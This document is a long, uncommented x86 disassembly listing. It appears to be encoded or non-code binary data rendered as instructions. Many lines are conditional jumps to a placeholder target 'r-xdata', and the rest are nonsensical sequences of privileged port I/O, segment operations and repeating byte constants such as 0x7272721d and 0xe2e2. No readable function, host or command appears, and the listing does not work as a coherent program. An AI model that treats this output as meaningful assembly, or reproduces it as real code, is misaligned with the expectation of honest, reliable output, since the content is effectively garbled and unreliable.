jb r-xdata
mov ch 0x1d
je r-xdata
sbb eax 0x99638a1d
jb r-xdata
push ebp
or edi edx
or bh [ edx + 0x6b848388 ]
cmpsd [ esi ] [ edi ]
or [ ebx ] cl
cli
cmp [ edx + 0x6b848688 ] 0xa7
imul esp [ edx + ecx ] 0x1d1d2e17
mov ebx 0xdac6a66f
imul esp [ edi + 0x2a890b06 ] 0x1d
sbb eax 0xb80bf51d
pop edi
sbb eax 0x7272721d
jb r-xdata
mov ch 0x6b
jb r-xdata
jb r-xdata
loop r-xdata
push cs
mov cl 0x1d
test [ esi - 0x1e ] 0x120be2e2
aaa
jb r-xdata
loop r-xdata
sbb eax 0xa725721d
jb r-xdata
sbb eax 0x810bbeb5
jb r-xdata
insb
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
popad
jb r-xdata
jb r-xdata
mov ebx 0xed2267bd
jb r-xdata
jb r-xdata
loope r-xdata
jb r-xdata
jb r-xdata
inc edx
jb r-xdata
jb r-xdata
leave
shl [ edx ] 0x1
test [ ebx - 0x59 ] ch
sbb al 0x6f
cmpsd [ esi ] [ edi ]
adc dh [ edx + 0xaeaa769 ]
mov [ edi - 0x58947b46 ] al
sbb cl [ eax + 0x6b84ba9a ]
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb [ eax + 0x6b84ba87 ] cl
cmpsd [ esi ] [ edi ]
push ds
xchg [ edx + 0x1aa76b84 ] edi
mov [ edx - 0x58947b46 ] bl
inc eax
adc ebx [ 0x7272721d ]
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
imul esi [ ebp + 0xb82a46b ] 0x79
jb r-xdata
imul esp [ edi + 0xb22d136 ] 0x58
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or [ ebx ] 0x61
jb r-xdata
and ch al
or ecx [ ebx + edx ]
push ss
mov edx 0x14a76b84
mov [ eax + 0x1d3d610b ] al
mov edx 0x6b849488
cmpsd [ esi ] [ edi ]
jb r-xdata
sbb eax 0x7272721d
imul esp [ edi - 0x58945de2 ] 0x18220b1e
shl [ eax ] cl
pop bx
add ebx [ 0x24170b1d ]
sbb eax 0xd2a46b1d
or bh [ ecx - 0x75e2e2ce ]
sbb eax 0x24170b1d
jb r-xdata
jb r-xdata
jb r-xdata
or ebx eax
jmp 0x72b8b4cf
loop r-xdata
jb r-xdata
mov cl 0x1d
xchg esi eax
ffreep st1
mov ah [ ebx - 0x67 ]
jb r-xdata
imul ebx [ edi + 0x59f60b1a ] 0x1d
movsb [ edi ] [ esi ]
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
mov cl 0xb4
mov ch 0xa
pop es
or esp edi
sbb [ 0x7272721d ] bl
or ecx [ ebx ]
loope r-xdata
jb r-xdata
out dx al
mov ch 0xbe
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
xor al 0x1d
jb r-xdata
and ch ch
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
sbb eax 0x6f72721d
cmpsd [ esi ] [ edi ]
imul esp [ edi + 0x1ea7611e ] 0xffffffe6
or eax ecx
retn 0xe2e2
mov dl 0x1d
mov ah 0xce
or esi [ ecx + 0x3f ]
jb r-xdata
sbb eax 0x67bdbbbb
imul esi [ edi + 0x348b0a46 ] 0x1d
jb r-xdata
loopne r-xdata
loop r-xdata
jb r-xdata
out 0xa1 al
jb r-xdata
jb r-xdata
jb r-xdata
push ecx
nop [ 0x1d100f0b ] ebx
sbb eax 0x72727272
jb r-xdata
push esp
in eax 0xb2
arpl [ 0xffffffffe2e2e228 ] sp
outsd
add eax 0xb21d1d10
mov cl 0xb1
mov ch ah
mov cl 0x1d
jne r-xdata
and cl [ bp + di ]
jb r-xdata
mov [ edx ] esp
call 0x1d58be9a
sbb eax 0x12d10a72
0x8816a76f 0xbe2
jb r-xdata
mov dl 0xb4
jb r-xdata
jb r-xdata
sbb eax 0x88b4b4b2
jb r-xdata
jb r-xdata
test [ ebx - 0x51 ] ch
dec edx
mov ah 0x6f
mov bh 0x69
push cs
or ecx [ esi + 0x7272e2e2 ]
jb r-xdata
arpl [ ecx + 0xbb5c1df ] bx
or edx [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x52741d1d
xchg [ ebx + ebp * 2 - 0x7745f559 ] al
add [ ebx + ebp * 2 - 0x5f4f759 ] 0x55
loop r-xdata
je r-xdata
jb r-xdata
cdq
jb r-xdata
or bh [ eax ]
xor eax 0x2f8a1d1d
mul dl
loop r-xdata
fld [ edi - 0x5b9b1212 ]
mov ch 0xb2
loop r-xdata
jb r-xdata
push esp
loop r-xdata
jb r-xdata
sbb eax 0x72727272
loop r-xdata
0x6fe2e2e0 0x1a67
jb r-xdata
loop r-xdata
push cs
or eax [ ecx + 0x72e2e2fe ]
in eax dx
jl r-xdata
imul edx [ edx ] 0x11d939d1
popad
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
int3
jb r-xdata
in eax dx
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
loop r-xdata
jecxz r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or ebx [ edx + 0x721d1d38 ]
jb r-xdata
cmpsd [ esi ] [ edi ]
push ss
mov dl ah
or eax [ edx ]
popad
jb r-xdata
jb r-xdata
outsd
scasd [ edi ]
or esi eax
push eax
sbb eax 0x7272721d
jb r-xdata
inc [ eax ]
sbb eax 0x66ed721d
lds ebp [ esi ]
sbb eax 0x36af6f1d
or esi eax
imul ebx [ edi + 0xfe0b74 ] 0x1d
sbb eax 0xc566ed72
sbb eax 0x36af6f1d
imul ebx [ edi + 0x36 ] 0x1f
sbb eax 0xf2b41d1d
or ebp eax
push cs
sbb eax 0x6f1b691d
outsd
sub bl [ edi ]
pop esi
nop [ 0x72727272 ] ebx
jb r-xdata
jb r-xdata
sbb eax 0xbb1721d
pop ss
loop r-xdata
jb r-xdata
shl [ ebp + 0x1d30d20b ] 0x1d
jb r-xdata
jb r-xdata
xor al 0x1d
mov ah 0xb5
or al [ edi ]
mov dl [ ebx ]
jb r-xdata
sbb al 0xb
jb r-xdata
or ecx [ es : eax + 0x1a ]
sbb bl [ bx ]
sbb eax 0xc2320b1d
loop r-xdata
push ds
sbb eax 0x2267aeb4
or edx [ ebx ]
adc ebx [ 0xffffffffa725721d ]
outsd
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
insb
mov [ edx - 0x20 ] 0xe2
loop r-xdata
or esp [ edx - 0x20 ]
leave
jb r-xdata
jb r-xdata
jb r-xdata
mov eax [ 0x18930bf6 ]
jb r-xdata
jb r-xdata
mov esi [ ebx - 0x424444e3 ]
jb r-xdata
cmpsd [ esi ] [ edi ]
0x1d0f510a 0xb1d
loop r-xdata
pop es
sbb eax 0x7272721d
jb r-xdata
mov ebx 0x2267bdbb
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmp [ 0x7272721d ] bl
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
mov ch 0x5c
sbb eax 0x7272721d
jb r-xdata
outsd
cmpsd [ esi ] [ edi ]
sbb eax 0xdf99638a
jb r-xdata
mov dl [ edx + 0x5c ]
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x3e0a0a1d
sbb eax 0x17bb0b1d
imul ebx [ ebx ] 0x1f2a6f6f
jb r-xdata
sbb eax 0xe2e24e74
or edx edx
xor [ 0x7272721d ] bl
jb r-xdata
mov dh 0x67
jb r-xdata
dec [ ebx + 0x26541da2 ]
jb r-xdata
push esp
jb r-xdata
sahf
jb r-xdata
sbb eax 0xb51d3e97
jb r-xdata
cmpsd [ esi ] [ edi ]
mov ah 0xae
and cl [ bp + di ]
jb r-xdata
jb r-xdata
adc [ edx + 0x1d0c110b ] bh
sbb eax 0x72727272
jb r-xdata
mov bh al
test [ ebx - 0x59 ] ch
jb r-xdata
jb r-xdata
mov esp [ edx ]
jb r-xdata
sbb eax 0x9269721d
fsubrp st1
adc ch ch
push ebp
mov dl 0x69
and al 0xa
jb r-xdata
test [ ecx - 0x26 ] ah
sbb eax 0xaa76f1d
jb r-xdata
jb r-xdata
sbb eax 0xbdbbbb1d
jb r-xdata
sbb [ 0x7272721d ] bl
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
mov ebp 0x67ed2267
jb r-xdata
jb r-xdata
loop r-xdata
rol ebx 0xe2
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
adc al 0xba
mov [ esp + eax * 4 - 0x45e55895 ] al
mov ah cl
test [ ebx - 0x59 ] ch
sbb [ edx + 0x1d1dca0b ] bh
sbb eax 0x32a76b84
or ebx [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
insd
adc [ 0x7272721d ] ebx
mov cl 0xb
jb r-xdata
pop esp
jb r-xdata
loop r-xdata
mov esi 0x900af6c6
sub ebx [ 0xb1dd11d ]
jb r-xdata
sbb eax 0x9e0a96b4
pop edi
sbb eax 0xed22671d
in eax 0xe2
je r-xdata
xor cl [ ebx ]
jne r-xdata
sbb eax 0x55edaa72
or esp [ ecx - 0x18 ]
loop r-xdata
jb r-xdata
or ebx [ esi ]
and ch ch
jb r-xdata
test eax 0x72e2e2ff
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
out 0xe3 al
loop r-xdata
sbb eax 0x14d1b21d
jb r-xdata
0x26a79b22
jb r-xdata
movsb [ edi ] [ esi ]
mul [ ecx + 0x26 ]
out dx al
test [ ebx - 0x59 ] ch
or ebp [ edi - 0x3e ]
loop r-xdata
in ax 0xc7
and ch ch
jb r-xdata
sbb eax 0xb414d1b2
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and ah [ esi - 0x1e ]
loop r-xdata
je r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
mov dl dh
jb r-xdata
jb r-xdata
outsd
jb r-xdata
mov [ edx - 0x1d153ff5 ] dl
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
and ch ch
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
shl [ ss : edx ] 0x1
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
cli
in eax dx
xor dl [ fs : ecx + 0x1d ]
sbb eax 0xf2c68661
jb r-xdata
sbb eax 0x2267aeb2
in eax dx
insb
sub ebx [ 0x526f6f1d ]
pop ds
sbb eax 0x20390a1d
sbb eax 0x169f6f1d
outsd
outsb
pop ds
sbb eax 0x9f6b841d
je r-xdata
outsd
cmpsd [ esi ] [ edi ]
test [ cs : ebx - 0x69 ] ch
dec esi
imul edx [ edi + 0x6b84b2ea ] 0x6fb44aaf
jb r-xdata
jb r-xdata
in eax dx
and bl bl
lahf
push ds
or ebx [ ebp + 0x721d1d30 ]
jb r-xdata
jb r-xdata
or ebp [ ebp + 0x11 ]
sbb eax 0x7272721d
jb r-xdata
sbb eax 0xe2e24e74
cmpsd [ esi ] [ edi ]
push ds
push 0xea6aeeaf
sbb eax 0x8aee2661
loop r-xdata
mov cl 0x1d
loop r-xdata
in al dx
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov esp 0x72212bb9
jb r-xdata
adc edi edi
loop r-xdata
jb r-xdata
jb r-xdata
or ebx [ 0x72e2e2c7 ]
out dx al
adc eax 0xa222f93a
sub esp [ ecx ]
jb r-xdata
jb r-xdata
or ecx esp
adc al 0x1d
sbb eax 0x3b9d0a72
sbb eax 0x2267aeb5
or esp [ ebx + 0x35 ]
sbb eax 0x7272721d
mov ah dh
jecxz r-xdata
mov dl 0xd1
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
jb r-xdata
loop r-xdata
rcl [ esp + esi * 4 ] 0x1
jb r-xdata
jb r-xdata
pop esi
jb r-xdata
jb r-xdata
loop r-xdata
imul esi [ edi + 0x3e ] 0x6b1d1d1f
jbe r-xdata
and cl [ bp + di ]
arpl [ 0x72721d1d ] si
jb r-xdata
scasb [ edi ]
loop r-xdata
loop r-xdata
loop r-xdata
outsd
imul esp [ edi - 0x3d7745fa ] 0xffffff84
imul esp [ edi - 0x2f7745fc ] 0xffffff84
imul esp [ edi + 0xb4c0b0a ] 0x1d
sbb eax 0xfb0b7272
out 0xe2 eax
loop r-xdata
ja r-xdata
adc al 0xb4
jb r-xdata
jb r-xdata
outsd
jb r-xdata
jb r-xdata
sub esp [ ecx ]
jb r-xdata
jb r-xdata
bound eax [ esi - 0x1e ]
loop r-xdata
and ch dl
mov dl 0x1d
xchg edi eax
push es
sbb eax 0xac69feb5
0x7e0b
jb r-xdata
or cl [ ebx + 0x30 ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or edx [ ebx + 0x721d1d18 ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov cl 0x8a
jb r-xdata
jb r-xdata
fstp [ esi + 0x66edf6c6 ]
0x8ae2e2e2 0xd87a
mov ah 0xa
jb r-xdata
jb r-xdata
retn 0xe2e2
and cl [ ebx ]
jb r-xdata
or ebx [ eax - 0x3e ]
shl [ edx ] 0x1
jb r-xdata
jb r-xdata
fsubrp st1
in eax dx
aaa
pop esi
sbb eax 0xc69e611d
mul bl
in eax dx
sub [ esi + 0x1d ] bl
sbb eax 0x1d38b10b
sbb eax 0x1d130a0a
sbb eax 0x19126f6f
sbb eax 0x23880a1d
mov dl 0x6f
jb r-xdata
imul esi [ edi - 0x47c49660 ] 0xb
lahf
or ebx [ 0xffffffff8495881d ]
sbb eax 0x721d1d39
jb r-xdata
movsb [ edi ] [ esi ]
sbb bl [ 0x7272721d ]
jb r-xdata
or al [ eax + 0x9 ]
sbb eax 0xed22671d
clc
sbb ebx [ 0x3a9f6f1d ]
outsd
outsd
push edx
pop ds
sbb eax 0xe1730b1d
loop r-xdata
outsd
lahf
push ss
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
push ds
or esp [ edx ]
sbb [ 0x7272721d ] bl
sub ecx [ bp + di ]
mov ch 0xb
jb r-xdata
ror [ eax - 0x79774580 ] cl
test [ ebx - 0x59 ] ch
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
or cl [ edx ]
sbb eax 0x17bb0b1d
loop r-xdata
and al 0x1d
sbb eax 0xad2a46b
mov ecx 0x8a1d1d32
loop r-xdata
sbb eax 0xe2e26275
loop r-xdata
pop ds
and cl [ bp + di ]
cli
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x5e64691d
in al 0x3c
jb r-xdata
jb r-xdata
loop r-xdata
sbb eax 0x1ea72572
popad
scasd [ edi ]
push ds
or ebx [ eax + 0xb1d1d12 ]
cmp eax 0x72721d1d
mov dl 0xa
imul ebx [ ebx + ecx ] 0x1d1d0454
jb r-xdata
or ebp [ ecx + 0x72e2e2ff ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x9d0a721d
jb r-xdata
jb r-xdata
outsd
or ecx [ eax + 0x1a ]
call 0x26a79b22
arpl [ esi ] cx
jb r-xdata
jb r-xdata
loop r-xdata
in eax 0xc7
jb r-xdata
jb r-xdata
jb r-xdata
cli
int3
mov ah 0x1d
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
and eax 0xe2e2e228
jb r-xdata
jb r-xdata
outsd
cmp bh cl
and ah [ edx + 0x7272212b ]
jb r-xdata
jb r-xdata
pop ds
sbb eax 0xea766b1d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov [ 0x7272212b ] al
popad
jb r-xdata
xchg edi eax
sbb ch [ ebx - 0x59 ]
xor cl [ ebx ]
inc eax
0xe2e2
xor [ 0xffffffffee26611d ] bl
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov dl 0xb4
or ecx ebp
mul dl
loop r-xdata
sbb bl [ 0xaa76f1d ]
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
dec ebx
jb r-xdata
jb r-xdata
pop eax
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
cmpsd [ esi ] [ edi ]
mov dl 0xb
jb r-xdata
cmpsd [ esi ] [ edi ]
and [ 0xffffffffa76b841d ] ebx
or cl [ ebx ]
imul ebx [ ecx + 0x1d ] 0xb2941d1d
test al 0x69
cmp cl [ ebx ]
jb r-xdata
imul edi [ edi - 0x48947bfa ] 0xffffffa0
jb r-xdata
loop r-xdata
mov edx 0x1d391d0b
sbb eax 0x72727272
or bh [ ecx ]
and [ 0x169f6f1d ] bl
mov eax [ 0x3264edfa ]
push ecx
sbb eax 0xc686611d
loop r-xdata
mov bh 0xb
popad
call 0x72b8b4ed
jb r-xdata
outsd
push edx
pop ds
sbb eax 0xa769b21d
0xb21de288 0x67ae
shl [ edx ] 0x1
jb r-xdata
sbb eax 0x7272721d
mov cl 0x1d
xchg esi eax
and eax 0xe3e2e0e2
loop r-xdata
and cl [ ebx ]
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x810bbeb5
jb r-xdata
jmp edx
mov ebp 0x212bb9bc
jb r-xdata
jb r-xdata
jb r-xdata
dec esi
loop r-xdata
sbb eax 0x2267b2b5
or esp [ esi - 0x20 ]
loop r-xdata
mov bh 0x69
jb r-xdata
jb r-xdata
or esi [ eax - 0x4 ]
jb r-xdata
jb r-xdata
jb r-xdata
adc [ ebx ] cl
jb r-xdata
jb r-xdata
sahf
mov ch 0xae
outsd
jb r-xdata
popad
in eax dx
pushad
push esi
out 0xe2 al
loop r-xdata
loop r-xdata
jb r-xdata
in eax dx
in al 0xe2
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
ja r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
retn
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
sbb eax 0xb20aa76f
mov ah 0xb
int 0xf6
jb r-xdata
jb r-xdata
mov esp [ edx - 0x1dd9abe3 ]
jb r-xdata
in eax dx
push esp
in eax 0xb
out dx eax
or eax 0x69721d1d
and ebp ebp
xor [ 0x22611d1d ] bl
loopne r-xdata
sbb eax 0xee26611d
sbb eax 0x1d362a0b
imul esp [ edi + 0x34090a1e ] 0x1d
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
0x691d1d05 0xb35
sbb eax 0x1a69e6b4
mov [ esi + 0x19180bb5 ] al
sbb eax 0x7272721d
test [ ebx - 0x59 ] ch
or [ ebx ] cl
mov cl 0x2a
sbb eax 0x7272721d
jb r-xdata
dec edx
adc eax 0xb41d1d1d
0xcea155ed 0x6784
mov dl 0xb
jb r-xdata
or [ eax ] 0x67bb1d1d
jb r-xdata
jmp 0x7262f137
push es
jb r-xdata
test [ ebx - 0x49 ] ch
jb r-xdata
test [ ebx - 0x41 ] ch
jb r-xdata
test [ ebx - 0x59 ] ch
in eax dx
pop si
out dx eax
loop r-xdata
jb r-xdata
xchg edi eax
or ch [ ebx - 0x59 ]
sbb bl [ 0x2267b6b5 ]
in eax dx
xor ax 0xe2e2
loop r-xdata
sbb eax 0xe2e24e74
jb r-xdata
aaa
push ds
jb r-xdata
and ah dl
loop r-xdata
imul esp [ esi + ebx * 2 - 0x1e ] 0x6c69e2e2
mov esi 0xe2fe810b
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul ebp [ edi + 0x12980b1e ] 0x650b1d1d
cmp eax 0x72721d1d
jb r-xdata
jbe r-xdata
cmp ebx [ 0xfffffffffa26611d ]
popfd
jb r-xdata
or esp [ ecx ]
or bl [ 0xffffffff9a0bb71d ]
in eax dx
loop r-xdata
cld
jb r-xdata
jb r-xdata
jo r-xdata
jb r-xdata
leave
jb r-xdata
sbb [ 0xffffffffe3750a1d ] ebx
adc bl [ ecx ]
jb r-xdata
mov esp 0x84c08821
jb r-xdata
jb r-xdata
mov [ ecx + 0x3aa76b84 ] dl
mov edx 0x930b8188
in eax dx
push ebp
popad
and esp eax
shl [ edx ] 0x1
outsd
mov eax 0xefd40b32
loop r-xdata
in al 0xe2
test [ ebx - 0xa ] ch
xchg ebx eax
movsb [ edi ] [ esi ]
fst [ edx ]
sbb eax 0x3fa066ed
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or al [ edi + 0xb1d1d33 ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul ch
0xffffe2e2 0x8ae2
and esp eax
or cl [ ecx ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
cmpsd [ esi ] [ edi ]
or dh [ edx - 0x932f44c ]
imul esp [ edx + 0x46 ] 0x61e2e2e2
xchg edx eax
or eax eax
0x7272e2e2 0x971d
sbb eax 0xe2e22654
jb r-xdata
and bl [ 0x69721d1d ]
cmpsd [ esi ] [ edi ]
push ds
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
loope r-xdata
and eax 0xafb40aa7
test eax 0xbf80bb4
sbb eax 0xf888b11d
mov cl 0xb
push edx
xor al 0x1d
sbb eax 0x3ebf6b84
mov ecx 0x6b848188
mov edi 0x8438693c
imul edi [ edi - 0x2b7746fe ] 0xffffff84
imul ebx [ edi - 0x297742f6 ] 0xffffff84
imul esi [ edi - 0x60947b32 ] 0x8
mov ebp 0x1d5e130b
popad
lahf
out dx al
loop r-xdata
fistp [ esi + 0x66edd2c6 ]
in eax dx
jb r-xdata
mov [ 0xbe2e2ea ] al
sbb eax 0x2267bb1d
in eax dx
jb r-xdata
jb r-xdata
imul edi [ ebx ] 0x30e90bb8
sbb eax 0xb972721d
mov bh 0xa0
jb r-xdata
mov al [ 0xbb83b69 ]
mov edi 0xb76b8406
jb r-xdata
push 0xffffffb2
mov cl 0xb1
mov dh ah
mov cl 0xb
mov [ edi ] dh
or dl [ esi + 0x671d1d02 ]
and cl [ ebx ]
daa
adc bl [ 0x7272721d ]
mov dh ah
or edi [ edi ]
adc bl [ 0x7272721d ]
jb r-xdata
dec esi
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
cmp esi 0x7272e2e2
mov [ 0x1d18e70b ] al
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xfa26611d
loop r-xdata
loop r-xdata
jb r-xdata
sbb eax 0xbe6881d
scasb [ edi ]
add eax 0x84721d1d
imul esp [ edi - 0x697745fa ] 0xb
fsubr st5
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or bl [ ebp + 0x611d1d3b ]
jb r-xdata
sbb eax 0xe3750a1d
imul esp [ edi - 0x494ae2ca ] 0x67
jb r-xdata
jb r-xdata
xchg edi eax
sbb eax 0xbf6b1297
jb r-xdata
jb r-xdata
loop r-xdata
mov ebx 0x62e36986
0x1c0be2e0 0x1d37
sbb eax 0xd1727272
xchg ebp eax
jb r-xdata
sbb eax 0xce0bea97
cmc
loop r-xdata
in eax dx
mov al [ 0x1d1d1d3f ]
xchg edi eax
out dx al
imul ecx [ esi ] 0x1e8761b3
in eax dx
jb r-xdata
cmpsd [ esi ] [ edi ]
sbb eax 0x2267b6b5
sbb eax 0x66ed721d
xor ebx [ 0x1bc0b1d ]
jb r-xdata
rol bx 0xe2
in eax dx
jb r-xdata
jb r-xdata
jb r-xdata
xor al 0x1d
jb r-xdata
jb r-xdata
jb r-xdata
cmpsb [ esi ] [ edi ]

loop r-xdata
jb r-xdata
or [ ebx + 0x362a0b1d ] esi
jb r-xdata
lahf
push ds
jb r-xdata
imul ebx [ edi - 0x5ef44de2 ] 0x3d
sbb eax 0xb35691d
out 0x56 eax
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
arpl [ esi ] cx
int1
and [ 0x7272721d ] ebx
jb r-xdata
jb r-xdata
loop r-xdata
sbb eax 0x17270b1d
jb r-xdata
aad 0xea
loop r-xdata
mov ebx 0x66ed2267
mov [ 0xbe2e2ea ] al
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xe25e6469
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov ah 0x69
adc ch ch
jb r-xdata
jpe r-xdata
sub eax 0x72721d1d
mov eax 0x88bb9488
test [ ecx + 0x20 ] ebp
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
or eax esp
jb r-xdata
in al 0xb5
mul [ es : edi + 0x22 ]
sub dh [ ebp - 0x1d0506f6 ]
loop r-xdata
adc ch [ ebx - 0x41 ]
jb r-xdata
sbb eax 0x72727272
jb r-xdata
and ch [ ebx - 0x59 ]
jb r-xdata
enter 0xe2c4 0xe2
sar [ ebx + 0x69e36986 ] cl
mov [ 0x1ea76bea ] al
or edi esi
in eax dx
loop r-xdata
jb r-xdata
sbb eax 0x1d01bc0b
jb r-xdata
int3
imul esp [ ecx + 0x18930bf6 ] 0x72721d1d
out dx al
jb r-xdata
jb r-xdata
jb r-xdata
and esi [ ebx ]
sbb ah [ ecx ]
jb r-xdata
and dl [ 0x1d1d ]
outsd
movsd [ edi ] [ esi ]
jecxz r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x9f6b841d
sbb eax 0x362a0b1d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
mov [ 0x1d1c750b ] al
sbb eax 0x84727272
test [ ebx - 0x59 ] ch
xor al 0x84
imul ebp [ edi - 0x457877ea ] 0xffffff88
mov es [ ebx + ebp * 2 - 0x7745eb59 ]
test [ ebx + ebp * 2 - 0x7745e559 ] al
imul ecx [ esi ] 0xe0620e63
loop r-xdata
cwd
das
sbb eax 0x9961841d
movsb [ edi ] [ esi ]
loop r-xdata
and ch ch
mov bh 0x69
push cs
int3
or al [ ecx - 0x44e2e2f8 ]
and ch ch
sbb eax 0x6b84721d
mov bh 0xc
mov [ edi + 0x6b843369 ] cl
or esp [ edi ]
jb r-xdata
and ch ch
jb r-xdata
outsd
cmpsd [ esi ] [ edi ]
push cs
mov dl 0xb5
or ebx [ ecx - 0x1b ]
loop r-xdata
cmp edi [ eax + 0x1d30e90b ]
jb r-xdata
sbb eax 0x84b97272
imul edi [ edi - 0x77c7965c ] 0xffffff81
test [ ebx - 0x41 ] ch
stosb [ edi ]
mov ecx 0xa8bf6b84
imul edi [ edx ] 0x1d21a70b
sbb eax 0xaa76b84
or ebp [ ecx + 0x59 ]
sbb eax 0xb2941d1d
mov eax 0x1d30e90b
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
imul ebp [ edx - 0x1e ] 0x228be2e2
pop esi
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov [ esp + eax * 4 - 0x45ed5895 ] al
mov [ ebx + 0x1d335f0b ] cl
sbb eax 0x72727272
jb r-xdata
cmp al [ ebx + ebp * 2 + 0x3b69eebf ]
test [ ebx - 0x41 ] ch
in al dx
or ebp [ ebx - 0xb ]
loop r-xdata
in eax dx
push esp
sbb cl cl
and eax 0xe2f75b0b
loop r-xdata
imul edx [ edx ] 0xb5e454ed
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x59 ] ch
imul esp [ ss : ebx ] 0x34a76b84
mov edx 0x6b849188
cmpsd [ esi ] [ edi ]
cmp bh [ edx - 0x6cf47e78 ]
mov [ ebx + edi * 4 + 0x20698588 ] dl
sbb eax 0x67fa2661
jb r-xdata
jb r-xdata
mov edi 0xf90ab52a
jb r-xdata
jb r-xdata
jb r-xdata
push ss
rcr [ 0x65f9669 ] 0x1
cmpsd [ esi ] [ edi ]
in eax dx
sbb ax 0xe2f4
jb r-xdata
jb r-xdata
loop r-xdata
mov esp 0x721d1d01
jb r-xdata
jb r-xdata
sub dh [ esi ]
jb r-xdata
mov [ 0xffffffffe226541d ] al
jb r-xdata
jb r-xdata
popad
cmp al 0xb
or ebp [ edx ]
jb r-xdata
jb r-xdata
mov ch 0x88
jb r-xdata
jb r-xdata
fucomi st0
jb r-xdata
jb r-xdata
test cl bl
sub eax 0x1d0a8c0b
sbb eax 0x72727272
sbb eax 0xe855ed1d
jpe r-xdata
jb r-xdata
loop r-xdata
mov cl 0xb4
mov [ esi + 0x1d56960b ] ah
sbb eax 0xc69edb72
shr ch cl
in ax dx
pop ss
jb r-xdata
push ebx
sbb eax 0x7272721d
jb r-xdata
imul esi [ edi - 0x58947bd4 ] 0x34
test [ ebx - 0x51 ] ch
push ss
mov [ edi - 0x7b717746 ] al
imul esp [ edi - 0x7b7745ec ] 0xffffff84
imul esp [ edi - 0x337745e6 ] 0xffffff84
imul esp [ edi - 0x35f445e8 ] 0x1d
sbb eax 0xa76b841d
xor cl [ ebx ]
pop ds
test [ ebx - 0x41 ] ch
movsb [ edi ] [ esi ]
